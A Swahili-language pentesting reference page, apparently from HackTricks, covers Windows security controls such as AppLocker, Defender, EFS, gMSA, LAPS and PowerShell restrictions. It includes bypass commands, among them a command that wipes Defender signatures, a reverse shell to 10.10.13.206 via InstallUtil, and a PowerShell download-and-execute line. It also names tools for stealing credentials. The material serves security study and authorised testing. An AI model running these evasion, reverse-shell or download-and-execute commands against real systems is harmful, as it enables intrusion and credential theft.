# Vidhibiti vya Usalama vya Windows

{{#include ../banners/hacktricks-training.md}}

## Sera ya AppLocker

Orodha ya programu zinazoruhusiwa ni orodha ya programu au executable zilizoidhinishwa ambazo zinaruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware hatari na programu zisizoidhinishwa ambazo haziendani na mahitaji mahususi ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la Microsoft la kuruhusu programu zilizoidhinishwa** na huwapa wasimamizi wa mfumo udhibiti wa **programu na faili ambazo watumiaji wanaweza kuendesha**. Hutoa **udhibiti wa kina** wa executable, scripts, faili za Windows installer, DLLs, programu zilizopakiwa, na installers za programu zilizopakiwa.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** pamoja na ruhusa ya kuandika kwenye folda fulani, **lakini yote haya yanaweza kuepukwa**.

### Kagua

Kagua ni faili/extensions zipi zimeorodheshwa kama zilizozuiwa/zinazoruhusiwa:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Njia hii ya registry ina mipangilio na policies zinazotumiwa na AppLocker, na hutoa njia ya kukagua seti ya sasa ya rules zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Folda zinazoweza kuandikwa** zinazofaa kwa kubypass AppLocker Policy: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **folda zinazoweza kuandikwa** unazoweza kutumia ku**bypass hii**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Binaries za [**"LOLBAS's"**](https://lolbas-project.github.io/) ambazo kwa kawaida **huaminika** zinaweza pia kutumika kubypass AppLocker.
- **Rules zilizoandikwa vibaya zinaweza pia kubypass**
- Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folder inayoitwa `allowed`** mahali popote na itaruhusiwa.
- Organizations pia mara nyingi huzingatia **kuzuia executable ya `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau kuhusu **maeneo** [**mengine ya PowerShell executable**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kama vile `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **DLL enforcement huwashwa mara chache sana** kwa sababu ya mzigo wa ziada inayoweza kuweka kwenye system, pamoja na kiasi cha testing kinachohitajika kuhakikisha hakuna kitakachoharibika. Kwa hiyo kutumia **DLLs kama backdoors kutasaidia kubypass AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **ku-execute** code ya **Powershell** ndani ya process yoyote na kubypass AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Uhifadhi wa Credentials

### Security Accounts Manager (SAM)

Credentials za local zinapatikana kwenye file hili, na passwords zime-hash.

### Local Security Authority (LSA) - LSASS

**Credentials** (zilizo-hash) **huhifadhiwa** kwenye **memory** ya subsystem hii kwa sababu za Single Sign-On.\
**LSA** husimamia **security policy** ya local (password policy, permissions za users...), **authentication**, **access tokens**...\
LSA ndiyo **itakayo-check** credentials zilizotolewa ndani ya file la **SAM** (kwa login ya local) na **kuwasiliana** na **domain controller** ili ku-authenticate user wa domain.

**Credentials** **huhifadhiwa** ndani ya **process ya LSASS**: Kerberos tickets, NT na LM hashes, passwords ambazo ni rahisi ku-decrypt.

### LSA secrets

LSA inaweza kuhifadhi baadhi ya credentials kwenye disk:

- Password ya computer account ya Active Directory (domain controller isiyoweza kufikiwa).
- Passwords za accounts za Windows services
- Passwords za scheduled tasks
- Mengine (password ya IIS applications...)

### NTDS.dit

Hii ni database ya Active Directory. Inapatikana tu kwenye Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana kwenye Windows 10 na Windows 11, pamoja na versions za Windows Server. **Huzuia** pentesting tools za kawaida kama vile **`WinPEAS`**. Hata hivyo, kuna njia za **kubypass protections hizi**.

### Kuangalia

Ili kuangalia **status** ya **Defender**, unaweza ku-execute PS cmdlet **`Get-MpComputerStatus`** (angalia value ya **`RealTimeProtectionEnabled`** ili kujua ikiwa iko active):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili ku-enumerate, unaweza pia ku-run:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Mfumo wa Faili Uliosimbwa kwa Njia ya Usimbaji (EFS)

EFS hulinda faili kupitia usimbaji, kwa kutumia **symmetric key** inayojulikana kama **File Encryption Key (FEK)**. Key hii husimbwa kwa kutumia **public key** ya mtumiaji na kuhifadhiwa ndani ya **alternative data stream** ya $EFS ya faili lililosimbwa. Usimbaji unapotakiwa, **private key** inayolingana ya **digital certificate** ya mtumiaji hutumika kusimbua FEK kutoka kwenye stream ya $EFS. Maelezo zaidi yanaweza kupatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Hali za usimbuaji bila kuanzishwa na mtumiaji** ni pamoja na:

- Faili au folda zinapohamishwa kwenye file system isiyotumia EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), husimbuliwa kiotomatiki.
- Faili zilizosimbwa zinazotumwa kupitia mtandao kwa kutumia itifaki ya SMB/CIFS husimbuliwa kabla ya kutumwa.

Mbinu hii ya usimbaji huruhusu **ufikiaji wa uwazi** wa faili zilizosimbwa kwa mmiliki. Hata hivyo, kubadilisha tu password ya mmiliki na kuingia hakutaruhusu usimbuaji.

**Mambo Muhimu ya Kukumbuka**:

- EFS hutumia symmetric FEK, iliyosimbwa kwa public key ya mtumiaji.
- Usimbuaji hutumia private key ya mtumiaji kufikia FEK.
- Usimbuaji wa kiotomatiki hutokea chini ya hali maalum, kama kunakili kwenye FAT32 au kutuma kupitia mtandao.
- Faili zilizosimbwa zinapatikana kwa mmiliki bila hatua za ziada.

### Kuangalia maelezo ya EFS

Angalia kama **user** **ametumia** **service** hii kwa kuangalia kama path hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Angalia **nani** ana **access** kwenye faili kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folder ili **kusimba** na **kusimbua** faili zote

### Kusimbua faili za EFS

#### Kuwa Authority System

Njia hii inahitaji **victim user** awe **anaendesha** **process** ndani ya host. Ikiwa ndivyo, kwa kutumia `meterpreter` sessions unaweza kuiga token ya process ya user (`impersonate_token` kutoka `incognito`). Au unaweza tu kufanya `migrate` kwenda kwenye process ya user.

#### Kujua password ya user

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa service accounts katika miundombinu ya IT. Tofauti na service accounts za kawaida ambazo mara nyingi huwa na setting ya "**Password never expire**" iliyowashwa, gMSAs hutoa suluhisho salama zaidi na linaloweza kusimamiwa kwa urahisi:

- **Usimamizi wa Password wa Kiotomatiki**: gMSAs hutumia password tata yenye herufi 240 ambayo hubadilika kiotomatiki kulingana na domain au computer policy. Mchakato huu unasimamiwa na Microsoft's Key Distribution Service (KDC), hivyo kuondoa hitaji la kusasisha password manually.
- **Usalama Ulioimarishwa**: Akaunti hizi haziathiriwi na lockouts na haziwezi kutumika kwa interactive logins, jambo linaloimarisha usalama wake.
- **Usaidizi wa Hosts Nyingi**: gMSAs zinaweza kushirikiwa kati ya hosts nyingi, hivyo kuzifanya zifae kwa services zinazoendeshwa kwenye servers nyingi.
- **Uwezo wa Scheduled Tasks**: Tofauti na managed service accounts, gMSAs zinaunga mkono uendeshaji wa scheduled tasks.
- **Usimamizi Rahisi wa SPN**: Mfumo husasisha kiotomatiki Service Principal Name (SPN) kunapokuwa na mabadiliko kwenye maelezo ya sAMaccount au DNS name ya computer, hivyo kurahisisha usimamizi wa SPN.

Password za gMSAs huhifadhiwa katika LDAP property _**msDS-ManagedPassword**_ na huwekwa upya kiotomatiki kila baada ya siku 30 na Domain Controllers (DCs). Password hii, ambayo ni encrypted data blob inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), inaweza kupatikana tu na administrators walioidhinishwa na servers ambazo gMSAs zimewekwa, hivyo kuhakikisha mazingira salama. Ili kufikia taarifa hii, secured connection kama LDAPS inahitajika, au connection lazima iwe authenticated kwa 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

Unaweza kusoma password hii kwa [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pata maelezo zaidi katika chapisho hili**](https://cube0x0.github.io/Relaying-for-gMSA/)

Pia, angalia [ukurasa huu wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kutekeleza **NTLM relay attack** ili **kusoma** **nenosiri** la **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

**Local Administrator Password Solution (LAPS)**, inayopatikana kwa kupakuliwa kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), huwezesha usimamizi wa manenosiri ya Administrator wa ndani. Manenosiri haya, ambayo ni **randomized**, ya kipekee, na **hubadilishwa mara kwa mara**, huhifadhiwa katikati katika Active Directory. Ufikiaji wa manenosiri haya huzuiwa kupitia ACLs kwa watumiaji walioidhinishwa. Kwa kupewa ruhusa za kutosha, uwezo wa kusoma manenosiri ya admin wa ndani hutolewa.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **huzuia vipengele vingi** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia COM objects, kuruhusu tu aina za .NET zilizoidhinishwa, workflows zinazotegemea XAML, PowerShell classes, na vinginevyo.

### **Kagua**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Katika Windows za sasa, hiyo Bypass haitafanya kazi, lakini unaweza kutumia[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuikompili, huenda ukahitaji** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> kuongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **kubadilisha mradi kuwa .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) **kutekeleza** code ya Powershell katika process yoyote na kupita constrained mode. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Sera ya Utekelezaji ya PS

Kwa chaguo-msingi imewekwa kuwa **restricted.** Njia kuu za kupita sera hii ni:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Zaidi inaweza kupatikana [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Ni API inayoweza kutumiwa kuthibitisha watumiaji.

SSPI itahusika na kutafuta itifaki inayofaa kwa mashine mbili zinazotaka kuwasiliana. Mbinu inayopendelewa kwa hili ni Kerberos. Kisha SSPI itajadili itifaki gani ya authentication itatumika. Itifaki hizi za authentication huitwa Security Support Provider (SSP), ziko ndani ya kila mashine ya Windows katika mfumo wa DLL, na mashine zote mbili lazima ziunge mkono SSP ileile ili ziweze kuwasiliana.

### Main SSPs

- **Kerberos**: Inayopendelewa
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** na **NTLMv2**: Kwa sababu za compatibility
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers na LDAP, password ikiwa katika mfumo wa MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Hutumika kujadili itifaki ya kutumia (Kerberos au NTLM, ambapo Kerberos ndiyo chaguo-msingi)
- %windir%\Windows\System32\lsasrv.dll

#### Negotiation inaweza kutoa mbinu kadhaa au moja tu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni feature inayowezesha **consent prompt kwa shughuli zenye elevated privileges**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Bypassing Applocker and Powershell contstrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
